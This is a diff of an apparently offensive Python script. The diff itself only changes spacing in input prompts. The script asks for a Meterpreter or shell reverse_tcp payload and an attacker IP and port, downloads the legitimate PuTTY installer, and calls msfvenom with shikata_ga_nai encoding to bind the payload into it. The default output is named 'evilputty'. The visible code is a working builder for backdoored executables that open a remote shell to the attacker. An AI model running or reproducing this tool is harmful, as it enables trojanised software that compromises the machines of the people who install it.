@@ -25,35 +25,35 @@ while 1:
 		
 		# chose payload
 		menus.backdoored_menu1()
-		selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
+		selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
 		if selection == '1' or selection == '':
 			payload = 'windows/meterpreter/reverse_tcp'
 		if selection == '2':
 			payload = 'windows/shell/reverse_tcp'
 		
 		# get some user info
-		ip = raw_input("\nEnter your local or remote ip (%s): " % iface)
+		ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
 		if ip == '':
 			ip = iface
-		port = raw_input("Enter a port (default 8080): ")
+		port = raw_input(" Enter a port (default 8080): ")
 		if port == '':
 			port = 8080
-		infile = raw_input("Enter path to executeable (default putty): ")
+		infile = raw_input(" Enter path to executeable (default putty): ")
 		if infile == '':
 			PrintInfo("Downloading putty.exe")
 			time.sleep(1)
 			urllib.urlretrieve('http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe','/tmp/putty.exe')
 			infile = '/tmp/putty.exe'
-		outfile = raw_input("Enter name for output file (default evilputty): ")
+		outfile = raw_input("\n Enter name for output file (default evilputty): ")
 		if outfile == '':
 			outfile = 'evilputty'
 						
 		# standard or powershell
 		menus.backdoored_menu2()
-		bdtype = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
+		bdtype = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
 		
 		if bdtype == '1':
-			PrintInfo("Binding payload to executeable")
+			PrintInfo("Binding payload to executeable\n")
 			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 5 -x %s -f exe > output/%s.exe" % (msf_path, payload, ip, port, infile, outfile), shell=True).wait()
 			PrintInfo("Payload output/%s created" % outfile)
 			
